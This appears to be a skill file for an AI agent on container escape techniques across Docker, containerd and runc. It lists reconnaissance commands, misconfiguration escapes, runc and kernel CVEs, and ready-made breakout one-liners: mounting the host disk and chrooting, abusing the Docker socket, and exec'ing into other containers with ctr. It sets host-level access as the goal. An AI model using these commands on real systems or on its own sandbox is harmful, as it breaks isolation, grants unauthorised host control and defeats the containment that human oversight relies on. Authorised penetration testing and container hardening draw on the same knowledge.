---
name: container-escapes
description: "Container escape techniques: runtime vulnerabilities, kernel exploits, and misconfigured isolation across Docker, containerd, and runc. Use this skill when a container must be broken out of."
---

# Container Escapes

## Overview

Escapes exploit either granted privileges or a runtime/kernel bug. Check privileges first — most escapes are configuration, not exploits.

## Determine the runtime

```bash
cat /proc/1/cgroup
ls /run/.containerenv 2>/dev/null
ls /.dockerenv
cat /proc/self/status | grep -i seccomp
```

## Misconfiguration escapes

| Config | Escape |
|---|---|
| `--privileged` | mount host devices |
| `--pid=host` | nsenter |
| `--net=host` | access host network |
| `-v /:/host` | read/write host fs |
| `-v /var/run/docker.sock` | control the host docker |
| `CAP_SYS_ADMIN` | mount, cgroup tricks |
| `CAP_DAC_READ_SEARCH` | read any file |

```bash
# privileged
mount /dev/sda1 /mnt && chroot /mnt sh
```

## Runtime vulnerabilities

| CVE | Effect |
|---|---|
| CVE-2019-5736 | runc overwrite host binary |
| CVE-2021-30465 | runc symlink mount escape |
| CVE-2022-0492 | cgroup release_agent |
| CVE-2024-21626 | runc leaked fd (Leaky Vessels) |

## Kernel exploits

```bash
uname -r
# Dirty Pipe 5.8–5.16: overwrite read-only files
# CVE-2022-0185: fs_context heap overflow
# overlayfs bugs
```

## Docker socket

```bash
docker run -v /:/host --privileged --rm -it alpine chroot /host sh
```

## containerd / CRI

```bash
ctr -n k8s.io containers list
ctr -n k8s.io tasks exec --exec-id x <container> sh
```

## Pitfalls

- Seccomp profiles block the syscalls most kernel exploits need.
- User namespaces map root to an unprivileged UID — a "root" shell is not host root.
- AppArmor/SELinux constrain file access even after mounting.

## Verification

The escape must produce host-level access (host PID, host filesystem write, or host network).
